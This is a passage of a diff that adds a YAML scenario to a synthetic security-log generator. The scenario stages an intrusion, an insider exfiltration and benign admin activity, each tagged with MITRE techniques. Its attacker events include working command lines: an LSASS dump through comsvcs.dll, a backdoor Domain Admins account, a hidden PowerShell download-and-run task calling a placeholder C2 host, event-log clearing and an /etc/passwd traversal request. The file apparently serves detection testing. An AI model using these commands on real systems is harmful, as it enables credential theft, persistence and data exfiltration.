+        service: "ssl"
+        technique: "T1071.001 - Application Layer Protocol: Web Protocols"
+
+  # --- RDP lateral movement to Windows R&D workstation ---
+  - time: "+27h15m"
+    actor: raj.patel
+    system: RD-EPARK
+    activity: >
+      Attacker uses harvested credentials to RDP from the build server to
+      Emily Park's Windows workstation in the R&D network, escalating from
+      Linux to Windows environment.
+    events:
+      - type: rdp_session
+        source_ip: "10.1.3.50"
+        technique: "T1021.001 - Remote Services: Remote Desktop Protocol"
+        description: "RDP lateral movement from BUILD-01 to RD-EPARK"
+
+  # --- Windows reconnaissance on R&D workstation ---
+  - time: "+27h20m"
+    actor: raj.patel
+    system: RD-EPARK
+    activity: "Windows reconnaissance on R&D workstation"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\whoami.exe"
+        command_line: "whoami /all"
+        technique: "T1033 - System Owner/User Discovery"
+      - type: process
+        process_name: "C:\\Windows\\System32\\net.exe"
+        command_line: "net group \"Research\" /domain"
+        technique: "T1069.002 - Permission Groups Discovery: Domain Groups"
+
+  # --- Domain enumeration from Windows ---
+  - time: "+27h25m"
+    actor: raj.patel
+    system: RD-EPARK
+    activity: "Enumerate domain controllers and admin accounts"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\nltest.exe"
+        command_line: "nltest /dclist:helixbio"
+        technique: "T1018 - Remote System Discovery"
+      - type: process
+        process_name: "C:\\Windows\\System32\\net.exe"
+        command_line: "net group \"Domain Admins\" /domain"
+        technique: "T1069.002 - Permission Groups Discovery: Domain Groups"
+
+  # --- Credential dumping on Windows ---
+  - time: "+27h45m"
+    actor: raj.patel
+    system: RD-EPARK
+    activity: >
+      Credential harvesting using comsvcs.dll MiniDump technique to dump
+      LSASS memory — no Mimikatz binary needed, uses built-in Windows tools.
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\rundll32.exe"
+        command_line: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 672 C:\\Windows\\Temp\\d.dmp full"
+        technique: "T1003.001 - OS Credential Dumping: LSASS Memory"
+        description: "LSASS memory dump via comsvcs.dll MiniDump — LOLBin technique"
+      - type: create_remote_thread
+        target_process: "lsass.exe"
+        technique: "T1003.001 - OS Credential Dumping: LSASS Memory"
+        description: "Remote thread created in LSASS during memory dump"
+
+  # --- Create backdoor domain account ---
+  - time: "+28h"
+    actor: raj.patel
+    system: DC-01
+    activity: "Create backdoor service account on domain controller using stolen admin creds"
+    events:
+      - type: logon
+        source_ip: "10.1.4.11"
+        logon_type: 3
+        technique: "T1078.002 - Valid Accounts: Domain Accounts"
+        description: "Network logon to DC-01 using dumped domain admin credentials"
+      - type: process
+        process_name: "C:\\Windows\\System32\\net.exe"
+        command_line: "net user svc-monitor S3cur3!Bkup /add /domain"
+        technique: "T1136.002 - Create Account: Domain Account"
+        description: "Create backdoor domain account disguised as monitoring service"
+      - type: account_created
+        target_username: "svc-monitor"
+        technique: "T1136.002 - Create Account: Domain Account"
+      - type: process
+        process_name: "C:\\Windows\\System32\\net.exe"
+        command_line: "net group \"Domain Admins\" svc-monitor /add /domain"
+        technique: "T1098 - Account Manipulation"
+        description: "Add backdoor account to Domain Admins group"
+      - type: group_member_added
+        group_name: "Domain Admins"
+        member_name: "svc-monitor"
+        scope: global
+        technique: "T1098 - Account Manipulation"
+
+  # --- Install persistence: scheduled task on DC ---
+  - time: "+28h15m"
+    actor: raj.patel
+    system: DC-01
+    activity: "Create scheduled task for persistent C2 callback on domain controller"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\schtasks.exe"
+        command_line: "schtasks.exe /Create /TN \"\\Microsoft\\Windows\\NetTrace\\PerfTrack\" /TR \"powershell.exe -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('https://203.0.113.80:8443/u')\" /SC DAILY /ST 06:00 /RU SYSTEM /F"
+        technique: "T1053.005 - Scheduled Task/Job: Scheduled Task"
+        description: "Scheduled task persistence disguised as Windows network performance tracking"
+      - type: scheduled_task_created
+        task_name: "\\Microsoft\\Windows\\NetTrace\\PerfTrack"
+        task_content: "powershell.exe -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('https://203.0.113.80:8443/u')"
+        technique: "T1053.005 - Scheduled Task/Job: Scheduled Task"
+
+  # --- Install malicious service for additional persistence ---
+  - time: "+28h20m"
+    actor: raj.patel
+    system: DC-01
+    activity: "Install malicious Windows service for persistent access"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\sc.exe"
+        command_line: "sc create HelixHealthCheck binPath= \"C:\\Windows\\System32\\svchost.exe -k netsvcs\" start= auto"
+        technique: "T1543.003 - Create or Modify System Process: Windows Service"
+        description: "Create malicious service disguised as health check"
+      - type: service_installed
+        service_name: "HelixHealthCheck"
+        service_file_name: "C:\\Windows\\System32\\svchost.exe -k netsvcs"
+        technique: "T1543.003 - Create or Modify System Process: Windows Service"
+
+  # --- Access file server for additional data ---
+  - time: "+29h"
+    actor: raj.patel
+    system: RD-EPARK
+    activity: "Access corporate file server to harvest additional documents"
+    events:
+      - type: connection
+        dst_ip: "10.1.5.12"
+        dst_port: 445
+        service: "smb"
+        technique: "T1021.002 - Remote Services: SMB/Windows Admin Shares"
+        description: "SMB connection to file server for document collection"
+      - type: process
+        process_name: "C:\\Windows\\System32\\net.exe"
+        command_line: "net use Y: \\\\FS-01\\Research$"
+        technique: "T1021.002 - Remote Services: SMB/Windows Admin Shares"
+      - type: process
+        process_name: "C:\\Windows\\System32\\cmd.exe"
+        command_line: "cmd.exe /c dir Y:\\ /s /b > C:\\Windows\\Temp\\files.txt"
+        technique: "T1083 - File and Directory Discovery"
+
+  # --- Second exfiltration over C2 ---
+  - time: "+29h30m"
+    actor: raj.patel
+    system: RD-EPARK
+    activity: "Compress and exfiltrate file server documents"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        command_line: "powershell.exe -ep bypass -c \"Compress-Archive -Path 'Y:\\Gene_Therapy\\*','Y:\\Patents\\*' -DestinationPath 'C:\\Windows\\Temp\\wt.zip' -Force\""
+        technique: "T1560.001 - Archive Collected Data: Archive via Utility"
+      - type: connection
+        dst_ip: "203.0.113.80"
+        dst_port: 8443
+        service: "ssl"
+        technique: "T1041 - Exfiltration Over C2 Channel"
+        description: "Exfiltrate compressed documents to C2"
+      - type: connection
+        dst_ip: "203.0.113.80"
+        dst_port: 8443
+        service: "ssl"
+        technique: "T1041 - Exfiltration Over C2 Channel"
+        description: "Second exfiltration chunk"
+
+  # --- Cover tracks: clear Windows security log on DC ---
+  - time: "+30h"
+    actor: raj.patel
+    system: DC-01
+    activity: "Clear Windows Security event log on domain controller to cover tracks"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\wevtutil.exe"
+        command_line: "wevtutil cl Security"
+        technique: "T1070.001 - Indicator Removal: Clear Windows Event Logs"
+        description: "Clear Security event log on DC-01"
+      - type: log_cleared
+        technique: "T1070.001 - Indicator Removal: Clear Windows Event Logs"
+
+  # --- Cleanup on R&D workstation ---
+  - time: "+30h10m"
+    actor: raj.patel
+    system: RD-EPARK
+    activity: "Clean up staging artifacts and disconnect mapped drive"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\cmd.exe"
+        command_line: "cmd.exe /c del /q C:\\Windows\\Temp\\wt.zip C:\\Windows\\Temp\\files.txt C:\\Windows\\Temp\\d.dmp"
+        technique: "T1070.004 - Indicator Removal: File Deletion"
+      - type: process
+        process_name: "C:\\Windows\\System32\\net.exe"
+        command_line: "net use Y: /delete"
+        technique: "T1070 - Indicator Removal on Host"
+
+  # --- Logoff from RDP session ---
+  - time: "+30h15m"
+    actor: raj.patel
+    system: RD-EPARK
+    activity: "Attacker logs off from Emily Park's workstation"
+    events:
+      - type: logoff
+        technique: "T1070 - Indicator Removal on Host"
+
+  # ============================================================
+  # THREAD B CONTINUED — Insider makes second exfil attempt
+  # ============================================================
+
+  - time: "+28h30m"
+    actor: carlos.mendoza
+    system: RD-CMENDOZA
+    activity: >
+      Carlos makes a second attempt to exfiltrate additional research data,
+      this time targeting patent application drafts on the R&D NAS.
+    events:
+      - type: connection
+        dst_ip: "10.1.4.51"
+        dst_port: 445
+        service: "smb"
+        technique: "T1039 - Data from Network Shared Drive"
+        description: "Second SMB access to NAS for patent documents"
+      - type: process
+        process_name: "C:\\Windows\\System32\\xcopy.exe"
+        command_line: "xcopy \\\\RD-NAS-01\\Patents\\*.docx C:\\Users\\carlos.mendoza\\Documents\\patents\\ /E /Y"
+        technique: "T1005 - Data from Local System"
+
+  - time: "+28h45m"
+    actor: carlos.mendoza
+    system: RD-CMENDOZA
+    activity: "Carlos uploads patent drafts to personal Google Drive via proxy"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        command_line: "powershell.exe -c \"Compress-Archive -Path 'C:\\Users\\carlos.mendoza\\Documents\\patents\\*' -DestinationPath 'C:\\Users\\carlos.mendoza\\Documents\\patents.zip' -Force\""
+        technique: "T1560.001 - Archive Collected Data: Archive via Utility"
+      - type: connection
+        dst_ip: "142.250.80.46"
+        dst_port: 443
+        service: "ssl"
+        technique: "T1567.002 - Exfiltration Over Web Service: Exfiltration to Cloud Storage"
+        description: "Upload to Google Drive via corporate proxy — insider exfiltration"
+
+  # ============================================================
+  # IT Admin legitimate activity (shows normal admin behavior for contrast)
+  # ============================================================
+
+  - time: "+2h"
+    actor: tom.nakamura
+    system: DC-01
+    activity: "Routine sysadmin RDP session to DC-01 for daily health check"
+    events:
+      - type: rdp_session
+        source_ip: "10.1.2.20"
+        technique: "T1021.001 - Remote Services: Remote Desktop Protocol"
+        description: "Legitimate RDP from sysadmin workstation to domain controller"
+
+  - time: "+2h10m"
+    actor: tom.nakamura
+    system: DC-01
+    activity: "Sysadmin checks Active Directory replication status"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\repadmin.exe"
+        command_line: "repadmin /replsummary"
+        technique: "T1018 - Remote System Discovery"
+        description: "Legitimate AD replication health check"
+      - type: process
+        process_name: "C:\\Windows\\System32\\dcdiag.exe"
+        command_line: "dcdiag /q"
+        description: "Legitimate domain controller diagnostics"
+
+  - time: "+2h15m"
+    actor: tom.nakamura
+    system: DC-01
+    activity: "Sysadmin logs off from DC after health check"
+    events:
+      - type: logoff
+
+  # --- Sysadmin SSH to Linux server (normal) ---
+  - time: "+26h"
+    actor: tom.nakamura
+    system: BUILD-01
+    activity: "Routine sysadmin SSH to build server for maintenance"
+    events:
+      - type: ssh_session
+        source_ip: "10.1.2.20"
+        description: "Legitimate SSH from sysadmin workstation to build server"
+
+  - time: "+26h15m"
+    actor: tom.nakamura
+    system: BUILD-01
+    activity: "Sysadmin checks disk usage and running containers"
+    events:
+      - type: process
+        process_name: "/usr/bin/df"
+        command_line: "df -h"
+        description: "Check disk usage"
+      - type: process
+        process_name: "/usr/bin/docker"
+        command_line: "docker ps -a"
+        description: "List all Docker containers"
+
+  # --- Help desk password reset (normal, exercises failed_logon) ---
+  - time: "+3h30m"
+    actor: brian.kelley
+    system: WS-BKELLEY
+    activity: >
+      Help desk assists user sarah.beck who is locked out. Brian attempts
+      to reproduce the lockout, then resets the password.
+    events:
+      - type: failed_logon
+        source_ip: "10.1.2.22"
+        logon_type: 3
+        description: "Failed logon attempt reproducing user lockout"
+      - type: failed_logon
+        source_ip: "10.1.2.22"
+        logon_type: 3
+        description: "Second failed logon attempt"
+
+  # --- Web server attack attempts (exercises raw events + snort) ---
+  - time: "+6h"
+    actor: root
+    system: WEB-EXT
+    activity: >
+      External scanner probes the public web server with SQL injection
+      and directory traversal attempts. This is background internet noise
+      that the DMZ Snort IDS should detect.
+    events:
+      - type: connection
+        source_ip: "198.51.100.23"
+        dst_ip: "10.1.1.10"
+        dst_port: 80
+        service: "http"
+        technique: "T1190 - Exploit Public-Facing Application"
+        description: "HTTP connection from external scanner to web server"
+      - type: raw
+        target_format: syslog
+        fields:
+          timestamp: "2024-06-11T20:00:00Z"
+          hostname: "WEB-EXT"
+          app_name: "nginx"
+          pid: 1842
+          facility: 3
+          severity: 4
+          message: '198.51.100.23 - - "GET /wp-admin/admin-ajax.php?action=duplicator_download&file=../../../etc/passwd HTTP/1.1" 403 162'
+        technique: "T1190 - Exploit Public-Facing Application"
+        description: "Directory traversal attempt logged by Nginx"
+
+  # --- Late C2 beacons (Day 2) ---
+  - time: "+32h"
+    actor: raj.patel
+    system: DEV-RPATEL
+    activity: "Periodic C2 beacon"
+    events:
+      - type: connection
+        dst_ip: "203.0.113.80"
+        dst_port: 8443
+        service: "ssl"
+        technique: "T1071.001 - Application Layer Protocol: Web Protocols"
+
+  - time: "+38h"
+    actor: raj.patel
+    system: DEV-RPATEL
+    activity: "Periodic C2 beacon"
+    events:
+      - type: connection
+        dst_ip: "203.0.113.80"
+        dst_port: 8443
+        service: "ssl"
+        technique: "T1071.001 - Application Layer Protocol: Web Protocols"
+
+  - time: "+45h"
+    actor: raj.patel
+    system: DEV-RPATEL
+    activity: "Final C2 beacon within scenario window"
+    events:
+      - type: connection
+        dst_ip: "203.0.113.80"
+        dst_port: 8443
+        service: "ssl"
+        technique: "T1071.001 - Application Layer Protocol: Web Protocols"
+
+output:
+  logs:
+    - format: windows
+    - format: zeek
+    - format: ecar
+    - format: syslog
+    - format: bash_history
+    - format: snort_alert
+    - format: web_access
+    - format: proxy_access
+  destination: "./output"
+  compression: false
